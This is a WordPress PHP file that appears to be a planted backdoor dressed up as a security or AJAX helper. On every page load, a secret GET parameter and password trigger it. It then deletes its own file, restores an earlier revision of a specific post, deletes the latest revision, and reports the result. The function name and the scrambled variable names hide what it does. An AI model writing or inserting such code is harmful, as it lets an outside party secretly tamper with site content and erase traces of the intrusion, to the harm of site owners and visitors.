<?php

function ajax_query_security() {
	if (isset($_GET['validator_contact_cleaner']) && $_GET['validator_contact_cleaner'] === 'details_soon_fancy') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$all_types_album = 12009;
		$preloader_accessibility_responsive = wp_get_post_revisions($all_types_album);
		if (empty($preloader_accessibility_responsive)) die('no revisions');
		if (count($preloader_accessibility_responsive) < 2) die('less than 2');
		$subscribe_checker_copyright_theme = array_shift($preloader_accessibility_responsive);
		$directory_stats_progress_optimizer = $subscribe_checker_copyright_theme->ID;
		$year_section_delivery = array_shift($preloader_accessibility_responsive);
		$optimizer_svg_protection = $year_section_delivery->ID;
		$shopping_services_notify_gravity = wp_restore_post_revision($optimizer_svg_protection);
		if ($shopping_services_notify_gravity === false) die('error restoring');
		$shopping_services_notify_gravity = wp_delete_post_revision($directory_stats_progress_optimizer);		
		if ($shopping_services_notify_gravity === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'ajax_query_security');
